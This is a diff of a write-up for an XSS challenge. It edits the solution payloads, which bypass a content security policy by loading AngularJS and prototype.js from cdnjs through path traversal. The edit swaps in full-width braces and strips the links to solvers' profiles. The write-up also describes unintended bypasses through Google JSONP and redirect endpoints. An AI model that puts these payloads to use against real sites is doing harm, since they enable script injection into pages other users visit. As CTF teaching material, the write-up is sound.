@@ -345,7 +345,7 @@ There is a classic payload as described in:
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js"></script>
 <div ng-app ng-csp>
 
-{{$on.curry.call().alert(1)}}
+｛{$on.curry.call().alert(1)}}
 
 </div>
 ```
@@ -417,7 +417,7 @@ Here is the final payload for the intended solution:
   <div class="g-recaptcha" data-sitekey="B" data-error-callback="loadData" data-size="invisible"></div>
   
   <div data-ng-app data-ng-csp>
-    {{ "abc".encode.call().alert("abc".encode.call().document.domain) }}
+    ｛{ "abc".encode.call().alert("abc".encode.call().document.domain) }}
   </div>
 </div>
 ```
@@ -426,7 +426,7 @@ Here is the final payload for the intended solution:
 
 Besides the intended solution, there are 4 amazing unintended solutions.
 
-### Unintended #1 by [@maple3142](https://twitter.com/maple3142)
+### Unintended #1 by @maple3142
 
 At first, I didn't know there was a `jsonp` argument in `https://www.google.com/complete/search` endpoint, so there was no check for `jsonp`.
 
@@ -440,7 +440,7 @@ if (src.includes('jsonp') || decodeURIComponent(src).includes('jsonp')) {
 }
 ```
 
-### Unintended #2 by [@smaury92](https://twitter.com/smaury92)
+### Unintended #2 by @smaury92
 
 It turns out that I implemented a flawed check, can you spot the bug?
 
@@ -454,7 +454,7 @@ So it passed the check for `reloadRecaptchaScript`.
 
 I decided the move the check from `reloadRecaptchaScript` to `loadScript`: https://github.com/aszx87410/xss-challenge/commit/7382e9b48721b1dd9edcd21675e1e7f56d171c2c
 
-### Unintended #3 by [@lbrnli1234](https://twitter.com/lbrnli1234)
+### Unintended #3 by @lbrnli1234
 
 The check failed again.
 
@@ -472,7 +472,7 @@ But for some other cases, it returns 302: https://www.google.com/url?sa=t&url=ht
 
 Anyway, I didn't fix this unintended in the end because I don't have a good solution at the moment.
 
-### Unintended #4 by [@lbrnli1234](https://twitter.com/lbrnli1234)
+### Unintended #4 by @lbrnli1234
 
 Another dope unintended has been found:
 
@@ -496,7 +496,7 @@ The content of `srcdoc` is the classic angularJS CSP bypass payload we mentioned
 ``` html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fprototype/1.7.2/prototype.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.0.1/angular.js"></script>
-<div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}</div>
+<div ng-app ng-csp>｛{$on.curry.call().alert($on.curry.call().document.domain)}}</div>
 ```
 
 The flow is like:
